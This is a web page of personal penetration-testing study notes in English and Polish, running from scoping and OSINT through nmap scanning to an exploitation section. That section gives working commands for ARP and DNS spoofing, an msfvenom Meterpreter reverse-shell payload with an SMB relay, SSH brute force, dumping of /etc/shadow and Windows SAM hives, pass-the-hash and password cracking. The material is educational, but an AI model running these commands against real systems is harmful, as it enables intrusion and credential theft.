<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta http-equiv="X-UA-Compatible" content="ie=edge" />
<link rel="stylesheet" href="/_assets/main.css" />

    <title>Overall Pentesting Process - Notatki</title>
  <link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
  <body>
    <div class="main">
      <nav class="navigation">
        <a href="/">Notatki</a>
      </nav>
      <article>
        <header>
          <h1 class="article-title">Overall Pentesting Process</h1>
          <div class="article-info">
            <div>
              <span
                >Created At：<time datetime="1660108141110"
                  >2022-08-10 01:09</time
                ></span
              >
              <span
                >Updated At：<time datetime="1660218449178"
                  >2022-08-11 07:47</time
                ></span
              >
            </div>
            
          </div>
        </header>
        <div class="article-content markdown-body"><h1 id="1-planning-and-scoping">1. Planning and Scoping</h1>
<ol>
<li>Initial information gathering
Understand the magnitude of the pentest
<ul>
<li>How many IPs will be tested?</li>
<li>How many assets?</li>
<li>How many URLs? How many pages per URL?
Understand the detection capabilities</li>
<li>Are there any WAF or next gen firewall?</li>
</ul>
</li>
<li>Create, review and sign agreements</li>
<li>Refine assets in scope</li>
<li>Define attacks and methodologies</li>
<li>Define rules of engagement</li>
</ol>
<p><strong>Types of penetration testing</strong>
Internal, external, web application, IoT, mobile, etc.
Black-box vs. grey-box vs white-box
<strong>Main Pentest Methodologies and Frameworks</strong> (The overall pentest process)</p>
<ul>
<li>PTES <a title="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines" href="http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines">http://www.pentest-standard.org/index.php/PTES_Technical_Guidelines</a></li>
<li>OWASP, mainly focused on Web Applications,  <a title="https://owasp.org/" href="https://owasp.org/">https://owasp.org/</a></li>
<li>MITRE ATT&amp;CK, framework for adversary emulation</li>
<li>NIST, non-regulatory agency of the US</li>
<li>OSSTMM, in-depth description of each step of a penetration testing</li>
<li>ISSAF, covers some of the most common attacks and tools. With a lot of practical examples</li>
</ul>
<p><strong>Most Common Compliance Standards</strong> (normy bezpieczeństwa)</p>
<ul>
<li>PCI-DSS</li>
<li>GDPR</li>
<li>HIPAA</li>
<li>SOX</li>
<li>NERC-CIP</li>
<li>ISO27001</li>
</ul>
<p><strong>The Importance of Paperwork</strong>
<em>Non-Disclosure Agreements (NDAs):</em> Ensure that the information discussed during the pentest will not be released to anyone outside of the project, hefty fines for breaking confidentiality rules
Also known as: Confidentiality Agreement (CA), Confidential Disclosure Agreement (CDA), Proprietary Information Agreement (PIA)
<em>Master Service Agreements (MSA)</em> Includes terms such as: how invoices will be sent, how payments will be made, ownership of intellectual properties, etc.
<em>Statement of Work (SOW)</em> Documents the details of a specific project, one SOW per pentest engagement, define things such as: assets in scope, project deliverables, price for the services, etc. You can have multiple SOWs for a client while having just one MSA
<em>Permission to Attack</em> Also known as “Get-Out-of-Jail-Free” cards, a document authorizing you to perform the attacks, Describe the attacks and dates of the tests, signed by a high-level executive in the client, includes their contact information, it is what differentiates you from a criminal</p>
<h1 id="2-information-gathering">2. Information Gathering</h1>
<p><strong>Main relevant information</strong>: Names, titles, email addresses, LinkedIn profiles, identity, public documents, etc.</p>
<h2 id="open-source-intelligence-osint">Open Source Intelligence (OSINT):</h2>
<p><em>Main passive techniques</em>: Search engine enumeration, social media, job postings, etc.
<em>Main active techniques</em>: Social engineering, phishing attempts, etc.</p>
<p><strong>Main sources of data and main tools</strong>: For both passive and active techniques
<em>search engines</em> (google, bing,baidou, shodan), social media (fb, linkedin, instagram, job posting),
<em>third party databases</em> (threat intelig. platforms, data breach compilation, web archive, WHOIS, certificate db)
<em>passive info gathering tools</em>: OWASP Amass, Sn1per, Maltego, Recon-NG, theHarvester</p>
<p><strong>Searh engine enumeriation</strong></p>
<ul>
<li>google dorks, <a title="https://www.exploit-db.com/google-hacking-database" href="https://www.exploit-db.com/google-hacking-database">https://www.exploit-db.com/google-hacking-database</a> (site:nasa.gov, filetype:pdf(log), allintext:user, intitle:“Index of /”)</li>
<li>shodan (search for tehnologies and services: find server with port 21 open, search for metadata)</li>
<li>password dump databases(HaveIBeenPwned, wyciek “collection #1-#5”)</li>
<li>website archives: <a title="https://web.archive.org/" href="https://web.archive.org/">https://web.archive.org/</a></li>
<li>CVE/CWE searches, public document enumeration</li>
</ul>
<hr />
<h2 id="narzędzia-passive">Narzędzia (passive)</h2>
<h3 id="theharvester">theHarvester</h3>
<p>It performs open source intelligence (OSINT) gathering to help determine a domain’s external threat landscape. The tool gathers names, emails, IPs, subdomains, and URLs by using multiple public resources
Enumerating search engines and scrapping  social media: Subdomains, hosts and IPs,  Email addresses, Twitter accounts, LinkedIn profiles</p>
<h3 id="recon-ng">Recon-ng</h3>
<p>Recon-ng is a full-featured reconnaissance framework designed with the goal of providing a powerful environment to conduct open source web-based reconnaissance quickly and thoroughly.
<strong>domain host enumeration</strong>
install module</p>
<div><pre class="hljs"><code><span class="hljs-variable">$ </span>marketplace search
<span class="hljs-variable">$ </span>marketplace install (nazwa co chcemy zainstalować)
<span class="hljs-variable">$ </span><span class="hljs-class"><span class="hljs-keyword">module</span> <span class="hljs-title">load</span> (<span class="hljs-title">nazwa</span>)</span>
<span class="hljs-variable">$ </span>info	-informacje jak posługiwać się modułem, manual</code></pre></div>
<h3 id="sn1per">Sn1per</h3>
<h3 id="maltego">Maltego</h3>
<h3 id="spiderfoot">SpiderFoot</h3>
<h3 id="owas-amass">OWAS Amass</h3>
<p><a title="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md" href="https://github.com/OWASP/Amass/blob/master/doc/user_guide.md">https://github.com/OWASP/Amass/blob/master/doc/user_guide.md</a></p>
<h3 id="github-elevenpathfoca">github ElevenPath/FOCA</h3>
<p>use search engines for document, extract metadata</p>
<h3 id="github-opsdiskmeatgoofil">github opsdisk/meatgoofil</h3>
<p>automate document search, githube search</p>
<h3 id="gitleaks-httpsgithubcomzricethezavgitleaks">GitLeaks -<a title="https://github.com/zricethezav/gitleaks" href="https://github.com/zricethezav/gitleaks">https://github.com/zricethezav/gitleaks</a></h3>
<p>przeszukuje repozytorium git w poszukiwaniu wrażliwych danych</p>
<h3 id="trufflehog-httpsgithubcomtrufflesecuritytrufflehog">TruffleHog- <a title="https://github.com/trufflesecurity/TruffleHog" href="https://github.com/trufflesecurity/TruffleHog">https://github.com/trufflesecurity/TruffleHog</a></h3>
<p>Find leaked credentials. git, github, gitlab, S3, filesystem, syslog, file and stdin (coming soon)</p>
<hr />
<h2 id="actively-gathering-port-and-service-information">Actively Gathering Port and Service Information</h2>
<h3 id="nmap-scripts">NMAP scripts</h3>
<div><pre class="hljs"><code><span class="hljs-attribute">nmap</span> -p <span class="hljs-number">21</span>,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">443</span> <span class="hljs-number">10.10.56.0</span>/<span class="hljs-number">24</span>
<span class="hljs-attribute">nmap</span> <span class="hljs-number">192.168.18.10</span>-<span class="hljs-number">25</span>
<span class="hljs-attribute">nmap</span> <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.*.<span class="hljs-number">10</span>
<span class="hljs-attribute">nmap</span> localhost
<span class="hljs-attribute">nmap</span> -iL targets.txt</code></pre></div>
<p>znajdź wszystkie hosty z podanego zakresu mające otwarte porty p, wypróbuje każdy adres z puli, * zastąpi liczbami 0-255</p>
<div><pre class="hljs"><code><span class="hljs-comment">* -iL -read target specifications from file</span>
<span class="hljs-comment">* -F - top 100 ports</span>
<span class="hljs-comment">* -T -speed of scan (0-5)</span></code></pre></div>
<p><strong>1.  host discovery</strong> w sieci</p>
<div><pre class="hljs"><code><span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> IP
<span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.1</span>-<span class="hljs-number">254</span> **lub** <span class="hljs-keyword">nmap</span> -<span class="hljs-keyword">sn</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">0.0</span>/<span class="hljs-number">24</span></code></pre></div>
<p><strong>2.  port scan</strong></p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> nmap -p- --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> IP
<span class="hljs-symbol">$</span> nmap -sU -p- --<span class="hljs-built_in">min</span>-rate=<span class="hljs-number">1000</span> IP

<span class="hljs-comment">* -sS domyślnie skan  -niepełny 3 way handshake, stealth("nie zauważalny tak po chuju bo pakiety są puste i podejrzane, zwykły skan mniej się rzuca w oczy")</span>
<span class="hljs-comment">* -sT -skanowanie z pełnym 3 way handshake</span>
<span class="hljs-comment">* -sU skan UDP</span>
<span class="hljs-comment">* -p- -wszystkie porty</span>
<span class="hljs-comment">* --open: Only show open (or possibly open) ports</span>
<span class="hljs-comment">* --min-rate=1000 1000 pakietów na s</span>
<span class="hljs-comment">* --top-ports 20 -20 najczęstrzych portów</span></code></pre></div>
<p><strong>2. Dalsze skanowanie portów</strong></p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> nmap -p {wcześniej znalezione porty} IP -vv -sC -sV

<span class="hljs-comment">* -vv verbose- więcej "v", więcej opisu</span>
<span class="hljs-comment">* -sC - --script=default</span>
<span class="hljs-comment">* -sV -service version</span>
<span class="hljs-comment">* -O -OS detection</span>
<span class="hljs-comment">* -oN/-oX/-oS/-oG/-oA &lt;file&gt; -wynik skanowania zapisany w foramtach normal, XML, s|rIpt kIddi3, grepable format, w 3 pierwszych foramtach na raz i nazwa pliku</span>
<span class="hljs-comment">* --script=  *(folder ze skryptami /usr/share/nmap/scripts)</span>
    - vuln
    - smb-enum-shares (enumerate smb shares)
    - smb-vuln-ms<span class="hljs-number">-010</span> - czy serwer jest wrażliwy <span class="hljs-literal">na</span> podatność Eternal Blue 
    - ftp-anon (FTP anonymous login)
    - http-title
<span class="hljs-comment">* --open</span>
<span class="hljs-comment">* -A -agresive</span></code></pre></div>
<h3 id="openvas-green-bone">OpenVAS (Green Bone)</h3>
<p><a title="https://www.greenbone.net/en/" href="https://www.greenbone.net/en/">https://www.greenbone.net/en/</a></p>
<h3 id="wpscan">WPScan</h3>
<p>Word press skaner
można dostać aklucz API ze strony <a title="https://wpscan.com/wordpress-security-scanner" href="https://wpscan.com/wordpress-security-scanner">https://wpscan.com/wordpress-security-scanner</a> i używać automatu połączonego z chmurą WPScan</p>
<div><pre class="hljs"><code>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.2.49</span> <span class="hljs-params">--api-token</span> {token}
* <span class="hljs-params">--url</span> -adres
</code></pre></div>
<h3 id="metasploit">Metasploit</h3>
<h3 id="sqlmap">SQLMap</h3>
<h3 id="owaspzap">OWASPZap</h3>
<h3 id="burp-suite">Burp Suite</h3>
<h3 id="nexpose-community">Nexpose Community</h3>
<p><strong>Website scraping and crawling</strong></p>
<h3 id="set-tolkit">SET Tolkit</h3>
<p><a title="https://github.com/trustedsec/social-engineer-toolkit" href="https://github.com/trustedsec/social-engineer-toolkit">https://github.com/trustedsec/social-engineer-toolkit</a>
The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. SET has a number of custom attack vectors that allow you to make a believable attack quickly. SET is a product of TrustedSec, LLC – an information security consulting firm located in Cleveland, Ohio.</p>
<h3 id="eyewitness">EyeWitness</h3>
<h3 id="dirb">Dirb</h3>
<p>Web Content Scanner. It looks for existing (and/or hidden) Web Objects. It basically works by launching a dictionary basesd attack against a web server and analizing the response.
enumeruje podstrony metodą bruteforce</p>
<h3 id="nikto">Nikto</h3>
<h3 id="commercial-tools">Commercial Tools</h3>
<p>xQualys, Nessus, Rapid7 Nexpose, Tenable,  F-Secure Radar, Tripwire IP360,  Burp Suite Pro, Metasploit Pro, etc.</p>
<h1 id="3-vulnerability-analysis">3. Vulnerability Analysis</h1>
<h1 id="4-exploitation">4. Exploitation</h1>
<h2 id="attack-against">Attack against</h2>
<p>Confidentiality,
Integrity (exploit trust existing betwen two entities): Data diddling, Salami attacks, Phishing
Availability (dostępność usług): DOS, DDOS, jamming, de-authentication attack, Telephone jamming, Power cut, Environment attacks</p>
<h2 id="attack-and-exploit-resources">Attack and Exploit Resources</h2>
<p>Mitre Att&amp;ck <a title="https://attack.mitre.org" href="https://attack.mitre.org">https://attack.mitre.org</a>
Attack and Exploit Resources CISA <a title="https://www.cisa.gov" href="https://www.cisa.gov">https://www.cisa.gov</a>
Microsoft <a title="https://docs.microsoft.com/en-us/security-updates" href="https://docs.microsoft.com/en-us/security-updates">https://docs.microsoft.com/en-us/security-updates</a>
Packet Storm Security <a title="https://packetstormsecurity.com" href="https://packetstormsecurity.com">https://packetstormsecurity.com</a>
Exploit Database <a title="https://www.exploit-db.com" href="https://www.exploit-db.com">https://www.exploit-db.com</a></p>
<h2 id="network-attacks">Network attacks</h2>
<h3 id="arp-spoofing">ARP spoofing</h3>
<p>ARP- link mac addres of interfacewith IP addres,
działanie: broadcast Who has 192.168.2.11, jeden host odpowiada i podaje swój MAC. ARP Spoofing- podszywanie się atakująćego pod Default Gateway<br />
<strong>arpspoof</strong> - najpopularniejsze, przekierowuje pakiety w sieci fałszując odpowiedzi w ARP
inne: Ettercap, Arpison, Cain and Abel
najpierw trzeba włączyć ip forwarding</p>
<div><pre class="hljs"><code>$ echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/</span>sys<span class="hljs-regexp">/net/i</span>pv4/ip_forward </code></pre></div>
<p>oszukiwanie hosta, podszywnaie się pod default gateway</p>
<div><pre class="hljs"><code>$ arpspoof -i eth0 -t <span class="hljs-number">192.168.2.10</span> <span class="hljs-number">192.168.2.1</span> -r</code></pre></div>
<p>oszukiwanie default gateway, podszywnaie się pod hosta</p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> arpspoof -i eth0 -t <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.1</span> <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.10</span> -r 
<span class="hljs-comment">* -i eth0 -mój interfejs podłączony do atakowanej sieci</span>
<span class="hljs-comment">* -t 192.168.2.10 -TARGET, host do którego wysyłane są oszukane pakiety, jeśli nie podany to zatruwa wszystkie hosty w sieci</span>
<span class="hljs-comment">* 192.168.2.1 -host pod którego się podszywamy (default gateway) </span>
<span class="hljs-comment">* -r -przechwytywanie ruchu w obu kierunkach</span></code></pre></div>
<h3 id="mac-spoofing">MAC spoofing</h3>
<p>Why:
protect privacy- device tracking (static MAC)
gain free acces to service
gain unauthorised acces to a network (MAC filtering na urządzeniach, np WiFi)
<strong>programy</strong>: Technitium MAC, NoVirus Thanks MAC, Smart MAC, SMAC MAC, Spoof-Me-Now
z terminala:</p>
<div><pre class="hljs"><code><span class="hljs-symbol">$</span> ifconfig eth0 down  			-położenie interfejsu
<span class="hljs-symbol">$</span> ifconfig hw ether <span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01</span> 	-zmiana MAC <span class="hljs-literal">na</span> wybrany
<span class="hljs-symbol">$</span> ifconfig eth0 up			-podniesienie interfejsu</code></pre></div>
<h3 id="switch-spoofing">Switch spoofing</h3>
<p>VLAN hopping attack
DTP (Dynamic Trunking Protocol)- automatyczne tworzneie łącz typu Trunk między switchami (CISCO chyba tylko), jeśli switch jest źle skonfigurowany (port w trybie Dynamic desirable, Dynamic auto, Trunk) to można stworzyć łącze Trunk między switchem, a podłączonym atakującym hostem udająć switch. Obrona to wyłączenie protokołów w switchu lub zmiana na <em>switchport mode acces</em>
<strong>progrmay</strong>: Yersinia- layer 2 attacks (przeciwko protokołom DTP, VTP, ISL)</p>
<h3 id="replay-and-relay-attacks">Replay and relay attacks</h3>
<p><strong>programy</strong>: Metasploit, Responder, Inveigh,</p>
<h4 id="smb-relay-attack">SMB Relay Attack</h4>
<p>Admin chce połączyć się z bazą danych, atakujący staje między i zahowuje się jak proxy dla admina i bazy, przekazuje pakiety między nimi, admin przekazuje credsy admina i przekazuje je jako swoje</p>
<div><pre class="hljs"><code><span class="hljs-comment"># tworzenie payloda dla bazy danych, który spowoduje nawiązanie sesji revese TCP</span>
$ msfvenom -p windows/meterpreter/reverse_tcp -a x86 <span class="hljs-attribute">LHOST</span>=192.168.2.121 <span class="hljs-attribute">LPORT</span>=4321 -f exe &gt; smb_rev.exe
-p -payload  
-a -target arhitecture
<span class="hljs-attribute">LHOST</span>=192.168.2.121 <span class="hljs-attribute">LPORT</span>=4321 -adres i<span class="hljs-built_in"> port </span>atakującej maszyny dla reverse TCP, mój adres i<span class="hljs-built_in"> port
</span>-f -msfvenom ma stworzyć windows executable
smb_rev.exe -nazwa stworzonego payloadu</code></pre></div>
<div><pre class="hljs"><code># tworzenie listenera dla połączenia zwrotnego nawiązywanego przez payload
<span class="hljs-symbol">$</span> msfconsole
<span class="hljs-symbol">$</span> use exploit/multi/handler
<span class="hljs-symbol">$</span> <span class="hljs-keyword">set</span> PAYLOAD <span class="hljs-comment">windows</span>/meterpreter/<span class="hljs-comment">reverse_tcp</span>
$ <span class="hljs-keyword">set</span> <span class="hljs-comment">LHOST 192.168.2.121</span>
$ <span class="hljs-keyword">set</span> <span class="hljs-comment">LPORT 4321</span>
$ run</code></pre></div>
<p>Włączanie ataku SMB Realay Attack</p>
<div><pre class="hljs"><code>$ <span class="hljs-keyword">python3</span> smbrelayx.<span class="hljs-keyword">py</span> -h <span class="hljs-number">192.168</span>.<span class="hljs-number">2.15</span> -<span class="hljs-keyword">e</span> smb_rev.<span class="hljs-keyword">exe</span>
-h <span class="hljs-number">192.168</span>.<span class="hljs-number">2.15</span> -target, baza danych
-<span class="hljs-keyword">e</span> smb_rev.<span class="hljs-keyword">exe</span> -uruchom binarkę smb_rev.<span class="hljs-keyword">exe</span></code></pre></div>
<p>po uruchomieniu program czeka na próbę autentykacji między adminem, a serwerem, wyożystuje ją, metasploit przechwytuje połączenie i daje reverse shell do serwera SMB</p>
<h3 id="dns-spoofing">DNS spoofing</h3>
<p>Windows: klienci łączący sie  z usługami MS Service wykorzystają NetBIOS resolution), Hostname resolution przy połączeniu TCP/IP nie do zasobów MS
MS Host name reolution order:</p>
<ol>
<li>Is it me?</li>
<li>Local host file C:\Windows\System32\drivers\etc (owner Admin)</li>
<li>Query Domain Name Service</li>
<li>Multicast query (czy ktoś inny zna adres IP domeny z którą chcę się połączyć)</li>
</ol>
<p><strong>programy</strong>: <strong>dnsspoof</strong>, Ettercap, Bettercap
Przykład:
Default Gateway: 192.168.2.1
Victim: 192.168.2.10
Fake Website: 192.168.2.20</p>
<ol>
<li>Utworzenie fałszywej strony</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-variable">$</span> <span class="hljs-built_in">cd</span> /tmp
<span class="hljs-variable">$</span> <span class="hljs-built_in">cp</span> ~/my_fake_websites/index.html .
<span class="hljs-variable">$</span> python3 <span class="hljs-literal">-m</span> http.server</code></pre></div>
<ol start="2">
<li>ARP spoofing, podszywanie się pod DG</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-variable">$ </span>echo <span class="hljs-number">1</span> &gt; <span class="hljs-regexp">/proc/sys</span><span class="hljs-regexp">/net/ipv</span>4/ip_forward 
<span class="hljs-variable">$ </span>arpspoof -i eth0 -t <span class="hljs-number">192.168</span>.<span class="hljs-number">2.10</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span>
<span class="hljs-variable">$ </span>arpspoof -i eth0 -t <span class="hljs-number">192.168</span>.<span class="hljs-number">2.1</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">2.10</span></code></pre></div>
<ol start="3">
<li>Stworzenie pliku z fałszywym wpisem DNS</li>
</ol>
<div><pre class="hljs"><code><span class="hljs-meta">$ </span><span class="language-bash"><span class="hljs-built_in">echo</span> 192.168.2.20 www.globomantics.com&gt; poisoned_hosts.txt</span></code></pre></div>
<ol start="4">
<li>Zatrucie DNS</li>
</ol>
<div><pre class="hljs"><code>$ dnsspoof -<span class="hljs-selector-tag">i</span> eth0 -f poisoned_hosts<span class="hljs-selector-class">.txt</span>
-<span class="hljs-selector-tag">i</span> eth0 -interfejs z któ¶ego nadaję
-f poisoned_hosts<span class="hljs-selector-class">.txt</span> -plik ze spreparowanym wpisem DNS</code></pre></div>
<ol start="5">
<li>Sprawdzenie czy atak zadziałał, nazwa <em>www.globomantics.com</em> powinna prowadzić do <em>192.168.2.20</em></li>
</ol>
<div><pre class="hljs"><code><span class="hljs-variable">$ </span>nslookup www.globomantics.com</code></pre></div>
<h2 id="password-attacks">Password attacks</h2>
<h3 id="account-lockout">Account Lockout</h3>
<p>zablokowanie konta poprzez wielokrotne podanie złego hasła- password guessing
czy accout lockout jest włączone</p>
<div><pre class="hljs"><code>&gt; net accounts (Windows)
$ <span class="hljs-keyword">grep</span> tally <span class="hljs-regexp">/etc/</span>pam.conf (Linux)
lub <span class="hljs-regexp">/etc/</span>pam.d</code></pre></div>
<p>Jeśli jest włączone to przetestować: próbować zalogować się wielokrotnie błędnie, w krótkim czasie, sprawdzić czy lockout zadziałał i nie można się zalogować (credsy dostać od admina)
<strong>Password guessing</strong> with <strong>THC hydra</strong>: brute force attack przeciwko serwerowi ssh, każda możliwa kombinacja z user i password</p>
<div><pre class="hljs"><code>hydra -L users.txt -P passwords.txt -t <span class="hljs-number">6</span> ssh:<span class="hljs-comment">//192.168.2.20 -u</span>
<span class="hljs-comment">* -L -plik tekstowy z loginami</span>
<span class="hljs-comment">* -P -plik tekstowy z hasłami</span>
<span class="hljs-comment">* -t6 -threads/wątki</span>
<span class="hljs-comment">* -u -password spraying (dla każdego hasła po kolei użytkownik, domyślnie to na użytkownika każde hasło i następny użytkownik)</span></code></pre></div>
<p><strong>Dictionary Attacks</strong> ??? (znaleźć program któ¶y na podstawie danych o osobie wytworzy słownik )
<strong>Obtaining Linux password representation</strong></p>
<div><pre class="hljs"><code><span class="hljs-regexp">/etc/</span>passwd
<span class="hljs-regexp">/etc/</span>shadow</code></pre></div>
<div><pre class="hljs"><code>$ unshadow <span class="hljs-regexp">/etc/</span>passwd <span class="hljs-regexp">/etc/</span>shadow &gt; crack.passwd.db -odszyfruj hasła linux <span class="hljs-keyword">do</span> pliku</code></pre></div>
<p><strong>Obtaining Windows password representation</strong> (roziwnąć się kiedyś w tym)<br />
Registry Hives: SAM  (Security Account Manager), system, Security; Memory;Windows Credential Manager; Active Directory database; Network Service accounts;</p>
<div><pre class="hljs"><code>&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\sam c:\temp\sam.<span class="hljs-keyword">save</span>
&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\system c:\temp\sam.<span class="hljs-keyword">save</span>
&gt; <span class="hljs-keyword">reg</span> <span class="hljs-keyword">save</span> hklm\security c:\temp\sam.<span class="hljs-keyword">save</span></code></pre></div>
<h3 id="pass-the-hash">Pass-the-hash</h3>
<p>nie uwieżytelnianie się hasłem tylko wysyłanie juz hasha hasła</p>
<div><pre class="hljs"><code>msf6 &gt; use exploit/windows/smb/psexec
msf6 &gt; <span class="hljs-built_in">set</span> RHOST 192.168.2.11
msf6 &gt; <span class="hljs-built_in">set</span> SMBUser Bob
msf6 &gt; <span class="hljs-built_in">set</span> SMBPass ASDaDSFsDGasfvaeRbAEFVAsFVa<span class="hljs-built_in">..</span>. (users hash)
msf6 &gt; <span class="hljs-built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp
msf6 &gt; run</code></pre></div>
<h3 id="password-cracking">Password Cracking</h3>
<p><strong>John-the-ripper</strong> modes: single crack, wordlist, incremental</p>
<div><pre class="hljs"><code>
$ john crack.passwd.db		<span class="hljs-comment"># basic use	</span>
$ john --worldlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/john/</span>password.lst --format=crypt --rules crack.passwd.sb
<span class="hljs-comment"># --worldlist=/usr/share/john/password.lst 	-wordlista</span>
<span class="hljs-comment"># --format=crypt 	-hash format</span>
<span class="hljs-comment"># --rules 	-mieszanie haseł robiąć z nich subzbiory, zwiększa różnorodność haseł </span>
<span class="hljs-comment"># crack.passwd.sb</span></code></pre></div>
<p><strong>Hashcat</strong></p>
<div><pre class="hljs"><code><span class="hljs-meta">$ </span><span class="language-bash">hashcat --<span class="hljs-built_in">help</span></span>
<span class="hljs-meta">$ </span><span class="language-bash">hashcat -m 500 example500.hash /usr/share/john/password.lst</span> 
<span class="hljs-meta"># </span><span class="language-bash">-m 500	-<span class="hljs-built_in">hash</span> <span class="hljs-built_in">type</span> (500=md5)</span>
<span class="hljs-meta"># </span><span class="language-bash">example500.hash 	-plik zawierający <span class="hljs-built_in">hash</span> hasła <span class="hljs-keyword">do</span> rozszyfrowania</span>
<span class="hljs-meta"># </span><span class="language-bash">/usr/share/john/password.lst	-word list</span></code></pre></div>
<p><strong>ophcrack</strong>: Rainbow tables</p>
<div><pre class="hljs"><code>ophcrack -g -d /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">tables</span> -t xp_free_fast,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>:vista_free -f hash.txt
-g -<span class="hljs-keyword">disable</span> gui
-d /<span class="hljs-type">path</span>/<span class="hljs-keyword">to</span>/<span class="hljs-keyword">tables</span>	-base <span class="hljs-type">path</span> <span class="hljs-keyword">to</span> rainbow <span class="hljs-keyword">tables</span> 
-t xp_free_fast,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>:vista_free -specify <span class="hljs-keyword">tables</span> <span class="hljs-keyword">to</span> use
-f hash.txt	-file containing hashes <span class="hljs-keyword">to</span> be cracked</code></pre></div>
<p><strong>Cain and Abel</strong> (windows, nie suportowany)</p>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>service account attacks
credsy są skradzione z pamięci, crackowane offline, …
programy: <strong>powersploit, empire</strong>, automatyzują</p>
<h2 id="attacking-wireless-networks">Attacking wireless networks</h2>
<p>Against Confidentiality: Evil twin, Bluesnarfing
Against Integrity: WPS PIN attack, RFID cloning,
Against Availability: Jamming, Deauthentication attack
<strong>programy</strong>: Air-crack-ng (<a title="https://www.aircrack-ng.org" href="https://www.aircrack-ng.org">https://www.aircrack-ng.org</a>), Kismet (<a title="https://www.kismetwireless.net" href="https://www.kismetwireless.net">https://www.kismetwireless.net</a>)(bt, sdr i inne wyspecjalizowane urządzenia), Wifite2 (<a title="https://github.com/derv82/wifite2" href="https://github.com/derv82/wifite2">https://github.com/derv82/wifite2</a>)</p>
<h3 id="aircrack-ng-suite">aircrack-ng suite</h3>
<p>airmon-ng -enable monitor mode on wireless interface, itd
aireplay-ng -inject frames,
aircrack-ng -szuka kluczy w przechwyconych pakietach,
airodump-ng -capture frames, może logować położenie GPS sieci jeśli jest dodatkowe urządzenie jest dołączone</p>
<div><pre class="hljs"><code>$ iwconfig <span class="hljs-comment">#list and identify local wireless network interface device </span>
$ airmon-ng<span class="hljs-built_in"> check </span>wlan0 <span class="hljs-comment">#czy są jakies procesy które mogą interferować z pracą aircrack-ng suite </span>
$ airmon-ng<span class="hljs-built_in"> check </span>kill <span class="hljs-comment">#ubij procesy przeszkadzające</span>
$ airmon-ng start wlan0 <span class="hljs-comment">#przełącz interfejs w tryb MONITOR</span>
$ iwconfig <span class="hljs-comment"># sprawdzeie czy interfejs przeszedł w tryb monitor i ma nową nazwę</span>
$ airodump-ng wlan0mon <span class="hljs-comment">#dump pakietów z ze skonfigurowanego interfejsu</span></code></pre></div>
<h3 id="scapy">SCAPY</h3>
<p><strong>mocne, zainteresować się</strong>
is a Python library and standalone program that enables users to send, sniff, dissect, and forge network packets. It can be installed using pip or the relevant package manager for your platform. We can scan, traceroute, probe, attack, and discover networks using Scapy. Imagine replacing hping, arpspoof, arping, tcpdump, tshark, p0f, and most of nmap with just one program.</p>
<h3 id="ataki-evil-twin-i-captive-portal">Ataki Evil Twin i Captive Portal</h3>
<p><strong>Evil Twin</strong> tworzony jest fałszywy Acces Point z takim samym SSID jak prawdziwy, atakujący rozpoczyna deautentykację (atak polegający na ) użytkownika podłączonego do prawdziwego AP, rozgłaszając ramkę deauth do użytkownika, zmuszając go do odłączenia się od prawdziwego punktu dostępowego. podszywające się pod AP urządzenie jest wtedy albo fizycznie zlokalizowany bliżej użytkownika niż prawdziwy AP, albo nadaje swój sygnał z większą siłą niż prawdziwy AP. Urządzenie użytkownika albo automatycznie połączy się ze złym bliźniakiem, ponieważ ma znany identyfikator SSID, albo po odłączeniu od legalnego punktu dostępu użytkownik uzyska dostęp do listy dostępnych punktów dostępu i połączy się ze znajomym identyfikatorem SSID. Może to następnie skłonić użytkownika do uwierzytelnienia, w którym to momencie atakujący może ukraść hasło do prawdziwego AP, umożliwiając atakującemu bezpośrednie połączenie z prawdziwym AP.
BSSID -adres MAC AP
ESSID -network name, user identify network</p>
<p>One common tactic that follows on from an evil twin attack is to present the user with a captive portal. A captive portal is a web page to which a client is redirected when they connect to a guest SSID. The client can gain access to the internet after they successfully authenticate or accept the terms of use on the portal page. Captive portals will be familiar to anyone that uses Wi‑Fi offered in public places, including hotels, transport hubs, and coffee shops. If we can trick the user into thinking that they need to reauthenticate after momentarily being disconnected from the network, we can capture those credentials and use them to gain access to the target network.</p>
<h3 id="pixie-dust-attack">Pixie Dust Attack</h3>
<h3 id="bluetooth-attacks">Bluetooth Attacks</h3>
